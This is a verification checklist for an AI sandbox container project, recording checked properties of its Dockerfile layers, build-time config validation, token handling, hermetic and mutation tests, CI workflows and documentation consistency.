- **Dockerfile layers.** PGDG fails closed (`--error-on=any` plus the `apt-cache policy` check). PGDG's main component only. MySQL and MariaDB templates wait for the bootstrap server to exit before the snapshot, and MariaDB uses `--auth-root-authentication-method=normal`, so `-uroot` works as the sandbox user. The MariaDB `Release` probe and `=1:<series>.*` pin, the Mongo series probe, the major key and `mongodb-org-server=<series>.*` are correct. Mongo's list and keyring names are consistent with the db-clients=mongo layer. The SHELL is bash, so the `<<<` and the arrays are valid.
- **Build-time validation.** `build.sh: validate_config()` and `validate_server_on_off()` handle lists, case variants, leading zeros, minors and releases, and refuse mysql together with mariadb. Build args are emitted only when a key is active.
- **Runtime wiring.** `sandbox-common.sh: services_csv()` uses `is_active`. `version_matches` handles prefixes (17 does not match 170.1).
- **Tests.** All six hermetic tests pass (test-start-services, -postgres, -redis, -mysql, -mariadb, -mongo), and all 23 mutation patches for 780–814 still `git apply --check` against HEAD.
- **Restart instructions** in docs/components/*.md checked for postgres, mysql, redis and mariadb. `mysqladmin`/`mariadb-admin shutdown` wait for the pid file, and redis removes its pid file on shutdown.

## BLD

- github_token handling in the nvm, pyenv and tools layers. The credential helper keeps the token in env only (no URL rewrite). `/tmp/gh-curl.cfg` is created 0600 and removed in the same RUN; any failure path fails the build, so no layer is committed. When no `--secret` is passed the mount is empty and every path stays anonymous. A stale token falls back to an anonymous curl for the installer fetches. Neither curl nor git echoes the token into the log.
- `build.sh` exports GITHUB_TOKEN from the GITHUB_PERSONAL_ACCESS_TOKEN fallback for `--secret id=github_token,env=GITHUB_TOKEN`. `preflight_private_tools` warns correctly.
- The nvm and pyenv retry loops: clean slate per attempt (nvm `rm`+`mkdir`, pyenv `rm` only); `-o` then `bash FILE`; the `-f`/`--retry` rule (`tests/test-build-fetch-retry.sh` passes, and its checker self-tests both ways). `install_url`'s `--retry 2` satisfies the rule.
- `remove_replaced_image()`: early return on same or empty ID, inspect failure treated as gone, tag-count gate, `rmi` without `--force`. The test passes and covers each branch.
- c-toolchain / KEEP_BUILD_TOOLCHAIN: the KEEP layer reinstalls build-essential after the cleanup purge. The qmd-layer purge is gated on KEEP!=1. `make` in the utilities layer is marked manual, so `--auto-remove` keeps it. The RUBY_RUNTIME layer refuses KEEP!=1. Mutation `310-make-not-installed.patch` still applies (with offset), and case 310 asserts `make`.
- Playwright: comma and lowercase refusal, ON→latest, OFF/empty→empty arg, is_active gating of `playwright.txt`, the `NR==1` marker plus `test -s`. `tests/test-playwright.sh` passes.
- `version_list` / `has_versions` for the literal `OFF`; `sandbox.sh` uses `version_list` for RUBY_VERSIONS.
- `generate_allowlists`: every per-component fragment present in `allowlist-domains.d/` has a gate. pyenv.txt (always included) covers PyPI for mkdocs and graphify. `active_tool_fragments` deduplicates. `custom.txt` is seeded from `.example`.
- tools-lib.sh descriptor parsing (comment-strip only after whitespace, trim, reset of stale fields). `expand_placeholders` (braced only). `install_url`: zero or several matching binaries refused, query/fragment stripped before the extension test. `install_repo_file`: JSON-directory guard, empty-file guard, private anonymous fallback suppressed. Public release path with pinned and latest versions. `api_get` discards a partial body.
- `.gitattributes` (`* text=auto eol=lf`): the only tracked non-LF entries are the two instruction symlinks.
- Hermetic tests run and passing: test-tools-d, test-build-fetch-retry, test-remove-replaced-image, test-playwright, test-sandbox-schema, test-parsers.

## TST

- **run-all.sh:**
  - exit 0 is downgraded to FAIL on any `^FAIL:` line;
  - "asserted nothing" fails;
  - SKIP is reported separately;
  - SCAFFOLD-FAILED is its own channel;
  - the mktemp shim is resolved before PATH changes;
  - the developer's pointer env is unset, and test-hermetic-env.sh enforces this (it found 0 violations).
- **integration/run.sh:**
  - rc 77 means SKIP;
  - 124 means a timeout FAIL;
  - rc 0 with a FAIL: line means FAIL;
  - rc 0 with no PASS: means FAIL;
  - a variant that fails to build fails its cases by name;
  - an empty selection is fatal;
  - `--require` handles the unterminated last skip entry;
  - `--cases` naming another variant's case is a deliberate no-op in sibling nightly jobs.
  - lib.sh's `skip()` is never called after an assertion in any case.
- **lib.sh helpers:** sidecar_up and dns_up check functional readiness; sandbox_up waits for PID 1 to be uid 1000; assert_no_capability checks the decode envelope. assert_not_writable/assert_blocked have no liveness check, but the cases that use them carry positive controls (400) or matching mutations (010).
- **docker-shim.sh:** strips `--name`, rewrites `-it`, applies the verify-mount settle, and sandbox.sh has a single `--name "$container_name"`.
- **mutate.sh:** apply/rollback/revert state, the dirty-tree refusal, and the stale/unchecked distinction in check and verify. All 78 patches apply; the six spot-checked patches land on their intended code.
- **test-mutations.sh:** every tiered case has a mutation; exemptions carry reasons.
- **lib-rebuild.sh:** the COPY parser covers all 18 Dockerfile COPY lines (single-source, no flags); no patch touches allowlist fragments.
- **verify-on-host.sh:**
  - VALID_PHASES rejects stale 1/2/3;
  - every phase records failures through phase_fail;
  - the RESULT exit code is right;
  - the schema gate takes BASE_REF from merge-base origin/main, falls back to HEAD^, and refuses HEAD itself;
  - the floor container gets the SELinux option;
  - Phase 7 lints untracked files too, a superset of CI.
- **hermetic-checks.yml:**
  - every job is pinned to ubuntu-24.04;
  - the schema gate uses `pull_request.base.sha` (against the merge checkout) or `event.before`, with a HEAD^ fallback;
  - falsify gates `--max-unproven-pct 10 --max-assertless 0` and then runs `--strict`;
  - the shellcheck install is bounded and retried.
- **tests.yml and nightly.yml:**
  - the PR gate is tests.yml calling hermetic-checks.yml;
  - nightly's hermetic job is gated on schedule and asserted through wf_job_key;
  - integration.yml's push/PR branch spells out `--require security`;
  - workflow_dispatch appends `packages` to exclude.
- **test-code-references.sh:** the fixture proves all seven rules can fail; the real tree resolves cleanly.
- **test-count-idiom.sh:** no missed variants in the tree (searched for `-E -c` and `--count` forms too).
- **portability.sh:** the GNU/BSD probes are made once; `p_zombie` comm parsing is sound.
- **falsify:**
  - the verdict channels are right (timeout, signal and scaffold give UNPROVEN; SURVIVED needs no signal at all);
  - ASSERTLESS is gated at 0;
  - every survivors.txt identity is in an active target;
  - the strict ledger is green at HEAD with 0 stale and 0 obsolete entries.

## DOC

- **Key sets match.** The sandbox.conf keys match AGENTS.md (apart from DOC-13) and docs/components/README.md: every key appears in the README.
  - Every key has a matching entry in build.sh, or is handled through the tools.d/`TOOL_VERSIONS` path (dtctl, acli) or the agent-tier runtime list (mkdocs).
- **Key grammars.** These sandbox.conf comments and component docs match `validate_config`:
  - postgres, redis, mysql, mariadb, mongo, playwright, angular-cli, db-clients
  - the SDKMAN full-patch rule
  - the mysql+mariadb refusal
  - `KEEP_BUILD_TOOLCHAIN` for ruby, db-clients and c-toolchain
- **Allowlist fragments.** Every fragment that AGENTS.md and the docs name exists. The gating matches: playwright `is_active`, mongodb via db-clients, and tools.d fragments via `active_tool_fragments`. PyPI is always reachable through pyenv.txt, so mkdocs works with graphify=OFF.
- **`./sandbox.sh --help`.** Modes, `[primary]` grammar and the defaults shown all match the code:
  - `CONTAINER_*`: 1.0 / 4g / 2g / 4g / 1048576:1048576
  - `SKILL_CHAR_BUDGET` 25000, `SLASH_COMMAND_TOOL_CHAR_BUDGET` 40000
  - `IMAGE_NAME` ai-sandbox, `SANDBOX_GIT_MAX` 200, `SELINUX_LABEL` auto
  - `sandbox.sh build` gives the documented error, and `-V` prints the three version lines.
- **Subcommands and flags.** All match AGENTS.md: repo.sh, group.sh, extract-discovery.sh, ai-containers-report.sh, changelog-coverage.sh, migrate-runme.sh, bump-sandbox-version.sh, the `check-sandbox-version.sh` `BASE_REF` default, and `tests/integration/run.sh` (including `--dry-run`, `--cases`, `--variant`, and variants such as services/mariadb).
- **verify-on-host.sh.** The `PHASES` default `4 5 6 7`, `VALID_PHASES`, and run order 0,5,7,6,4 match.
- **Names AGENTS.md cites.** All exist at HEAD:
  - About 70 function names, including `container_env_filter`, `_link_walk`, `git_dirs_in`, `selinux_security_opt` and `services_csv`.
  - Env vars such as `REPO_VOLUME_PREFIX`, `AI_SERVICES_*`, `AI_LAUNCHER_ANCHOR`, `UV_PYTHON_INSTALL_DIR` and `AI_RUNTIME_TOOLS`.
  - Every test, case, mutation and workflow path it names (spot-checked 230/240/310/320/450–465/730 and 310-make-not-installed.patch).
  - The symlinks `.github/copilot-instructions.md` and `.kiro/steering/AGENTS.md`.
  - The `AI_CONTAINERS_SHARED_FILES` members, plus the tools.d/services.d copies in init and sync.
  - `tests/test-code-references.sh` passes (64 citations).
- **Internal links.** Every internal link and anchor in README, AGENTS and docs resolves, except `#sandboxconf-schema-versioning` in an old, dated CHANGELOG entry.
- **CHANGELOG.**
  - Tags v0.9.x–v0.10.7 match the section headings.
  - Each release from v0.10.0 to v0.10.7 covers its feat/fix commits.
  - Unreleased is empty, but the only changes since v0.10.7 are two test-only commits, so nothing user-facing is missing.
  - `runme.sh` takes the token from `gh` and answers `--version` before building, as the README says.
- **Component docs.** Every docs/components file except graphify.md (DOC-12) and components/README.md (DOC-11) matches its adapter and Dockerfile layer.
